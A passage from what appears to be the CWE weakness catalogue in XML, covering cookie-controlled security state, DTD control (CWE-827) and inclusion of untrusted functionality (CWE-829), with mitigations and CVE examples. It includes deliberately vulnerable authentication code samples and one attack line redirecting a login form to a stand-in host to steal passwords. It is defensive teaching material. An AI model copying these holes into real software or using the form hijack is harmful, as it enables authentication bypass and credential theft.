                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-14">
               <Phase>Architecture and Design</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store state information and sensitive data on the server side only.</xhtml:p>
                  <xhtml:p>Ensure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.</xhtml:p>
                  <xhtml:p>If information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that you has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.2">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>With a stateless protocol such as HTTP, use a framework that maintains the state for you.</xhtml:p>
                  <xhtml:p>Examples include ASP.NET View State [REF-756] and the OWASP ESAPI Session Management feature [REF-45].</xhtml:p>
                  <xhtml:p>Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Phase>Operation</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Identify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-15">
               <Intro_Text>The following code excerpt reads a value from a browser cookie to determine the role of the user.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:10px;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("role")) {<xhtml:div style="margin-left:10px;">userRole = c.getValue();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-16">
               <Intro_Text>The following code could be for a medical records application. It performs authentication by checking if a cookie has been set.</Intro_Text>
               <Example_Code Nature="bad" Language="PHP">
                  <xhtml:div>$auth = $_COOKIES['authenticated'];<xhtml:br/>if (! $auth) {<xhtml:div style="margin-left:10px;">if (AuthenticateUser($_POST['user'], $_POST['password']) == "success") {<xhtml:div style="margin-left:10px;">// save the cookie to send out in future responses<xhtml:br/>setcookie("authenticated", "1", time()+60*60*2);</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:10px;">ShowLoginScreen();<xhtml:br/>die("\n");</xhtml:div>}</xhtml:div>}<xhtml:br/>DisplayMedicalHistory($_POST['patient_ID']);</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer expects that the AuthenticateUser() check will always be applied, and the "authenticated" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie.</Body_Text>
               <Body_Text>However, the attacker can set the "authenticated" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-17">
               <Intro_Text>In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:10px;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("authenticated") &amp;&amp; Boolean.TRUE.equals(c.getValue())) {<xhtml:div style="margin-left:10px;">authenticated = true;</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-93">
               <Intro_Text>The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>struct hostent *hp;struct in_addr myaddr;<xhtml:br/>char* tHost = "trustme.example.com";<xhtml:br/>myaddr.s_addr=inet_addr(ip_addr_string);<xhtml:br/>
                     <xhtml:br/>hp = gethostbyaddr((char *) &amp;myaddr, sizeof(struct in_addr), AF_INET);<xhtml:br/>if (hp &amp;&amp; !strncmp(hp-&gt;h_name, tHost, sizeof(tHost))) {<xhtml:div style="margin-left:10px;">trusted = true;</xhtml:div>} else {<xhtml:div style="margin-left:10px;">trusted = false;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>String ip = request.getRemoteAddr();<xhtml:br/>InetAddress addr = InetAddress.getByName(ip);<xhtml:br/>if (addr.getCanonicalHostName().endsWith("trustme.com")) {<xhtml:div style="margin-left:10px;">trusted = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="C#">
                  <xhtml:div>IPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);<xhtml:br/>IPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);<xhtml:br/>if (hostInfo.HostName.EndsWith("trustme.com")) {<xhtml:div style="margin-left:10px;">trusted = true;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>IP addresses are more reliable than DNS names, but they can also be spoofed. Attackers can easily forge the source IP address of the packets they send, but response packets will return to the forged IP address. To see the response packets, the attacker has to sniff the traffic between the victim machine and the forged IP address. In order to accomplish the required sniffing, attackers typically attempt to locate themselves on the same subnet as the victim machine. Attackers may be able to circumvent this requirement by using source routing, but source routing is disabled across much of the Internet today. In summary, IP address verification can be a useful part of an authentication scheme, but it should not be the single factor required for authentication.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-1549</Reference>
               <Description>Attacker can bypass authentication by setting a cookie to a specific value.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1549</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1619</Reference>
               <Description>Attacker can bypass authentication and gain admin privileges by setting an "admin" cookie to 1.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1619</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0864</Reference>
               <Description>Content management system allows admin privileges by setting a "login" cookie to "OK."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0864</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5784</Reference>
               <Description>e-dating application allows admin privileges by setting the admin cookie to 1.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5784</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6291</Reference>
               <Description>Web-based email list manager allows attackers to gain admin privileges by setting a login cookie to "admin."</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-6291</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>SEC09-J</Entry_ID>
               <Entry_Name>Do not base security checks on untrusted sources</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-754"/>
            <Reference External_Reference_ID="REF-529"/>
            <Reference External_Reference_ID="REF-756"/>
            <Reference External_Reference_ID="REF-45"/>
         </References>
         
      </Weakness>
      <Weakness ID="827" Name="Improper Control of Document Type Definition" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software does not restrict a reference to a Document Type Definition (DTD) to the intended control sphere. This might allow attackers to reference arbitrary DTDs, possibly causing the software to expose files, consume excessive system resources, or execute arbitrary http requests on behalf of the attacker.</Description>
         <Extended_Description>
            <xhtml:p>As DTDs are processed, they might try to read or include files on the machine performing the parsing. If an attacker is able to control the DTD, then the attacker might be able to specify sensitive resources or requests or provide malicious content.</xhtml:p>
            <xhtml:p>For example, the SOAP specification prohibits SOAP messages from containing DTDs.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="829" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="776" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="XML" Prevalence="Undetermined"/>
            <Paradigm Name="Web Based" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Note>If the attacker is able to include a crafted DTD and a default entity resolver is enabled, the attacker may be able to access arbitrary files on the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Note>The DTD may cause the parser to consume excessive CPU cycles or memory using techniques such as nested or recursive entity references (CWE-776).</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>The DTD may include arbitrary HTTP requests that the server may execute. This could lead to other attacks leveraging the server's trust relationship with other entities.</Note>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2010-2076</Reference>
               <Description>Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2076</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-773"/>
         </References>
         
      </Weakness>
      <Weakness ID="829" Name="Inclusion of Functionality from Untrusted Control Sphere" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software imports, requires, or includes executable functionality (such as a library) from a source that is outside of the intended control sphere.</Description>
         <Extended_Description>
            <xhtml:p>When including third-party functionality, such as a web widget, library, or other source of functionality, the software must effectively trust that functionality. Without sufficient protection mechanisms, the functionality could be malicious in nature (either by coming from an untrusted source, being spoofed, or being modified in transit from a trusted source). The functionality might also contain its own weaknesses, or grant access to additional functionality and state information that should be kept private to the base system, such as system state information, sensitive application data, or the DOM of a web application.</xhtml:p>
            <xhtml:p>This might lead to many different consequences depending on the included functionality, but some examples include injection of malware, information exposure by granting excessive privileges or permissions to the untrusted functionality, DOM-based XSS vulnerabilities, stealing user's cookies, or open redirect to malware (CWE-601).</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="669" View_ID="699" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>An attacker could insert malicious functionality into the program by causing the program to download code that the attacker has placed into the untrusted control sphere, such as a malicious web site.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Enforcement by Conversion</Strategy>
               <Description>
                  <xhtml:p>When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.</xhtml:p>
                  <xhtml:p>For example, ID 1 could map to "inbox.txt" and ID 2 could map to "profile.txt". Features such as the ESAPI AccessReferenceMap [REF-45] provide this capability.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-22">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Sandbox or Jail</Strategy>
               <Description>
                  <xhtml:p>Run the code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software.</xhtml:p>
                  <xhtml:p>OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations.</xhtml:p>
                  <xhtml:p>This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise.</xhtml:p>
                  <xhtml:p>Be careful to avoid CWE-243 and other weaknesses related to jails.</xhtml:p>
               </Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>The effectiveness of this mitigation depends on the prevention capabilities of the specific sandbox or jail being used and might only help to reduce the scope of an attack, such as restricting the attacker to certain system calls or limiting the portion of the file system that can be accessed.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Environment Hardening</Strategy>
               <Description>Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5.1">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
                  <xhtml:p>When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.</xhtml:p>
                  <xhtml:p>Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-34">
               <Phase>Architecture and Design</Phase>
               <Phase>Operation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately.</xhtml:p>
                  <xhtml:p>This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>
                  <xhtml:p>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</xhtml:p>
                  <xhtml:p>Many file inclusion problems occur because the programmer assumed that certain inputs could not be modified, especially for cookies and URL components.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Phase>Operation</Phase>
               <Strategy>Firewall</Strategy>
               <Description>Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-94">
               <Intro_Text>This login webpage includes a weather widget from an external website:</Intro_Text>
               <Example_Code Nature="bad" Language="HTML">
                  <xhtml:div>&lt;div class="header"&gt; Welcome!<xhtml:div style="margin-left:10px;">&lt;div id="loginBox"&gt;Please Login:<xhtml:div style="margin-left:10px;">&lt;form id ="loginForm" name="loginForm" action="login.php" method="post"&gt;<xhtml:br/>Username: &lt;input type="text" name="username" /&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>Password: &lt;input type="password" name="password" /&gt;<xhtml:br/>&lt;input type="submit" value="Login" /&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>&lt;/div&gt;<xhtml:br/>&lt;div id="WeatherWidget"&gt;<xhtml:div style="margin-left:10px;">&lt;script type="text/javascript" src="externalDomain.example.com/weatherwidget.js"&gt;&lt;/script&gt;</xhtml:div>&lt;/div&gt;</xhtml:div>&lt;/div&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>This webpage is now only as secure as the external domain it is including functionality from. If an attacker compromised the external domain and could add malicious scripts to the weatherwidget.js file, the attacker would have complete control, as seen in any XSS weakness (CWE-79).</Body_Text>
               <Body_Text>For example, user login information could easily be stolen with a single line added to weatherwidget.js:</Body_Text>
               <Example_Code Nature="attack" Language="JavaScript">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i>...Weather widget code....</xhtml:i>
                     <xhtml:br/>document.getElementById('loginForm').action = "ATTACK.example.com/stealPassword.php";</xhtml:div>
               </Example_Code>
               <Body_Text>This line of javascript changes the login form's original action target from the original website to an attack site. As a result, if a user attempts to login their username and password will be sent directly to the attack site.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2010-2076</Reference>
               <Description>Product does not properly reject DTDs in SOAP messages, which allows remote attackers to read arbitrary files, send HTTP requests to intranet servers, or cause a denial of service.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2076</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0285</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0285</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0030</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0030</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0068</Reference>
               <Description>Modification of assumed-immutable configuration variable in include file allows file inclusion via direct request.</Description>
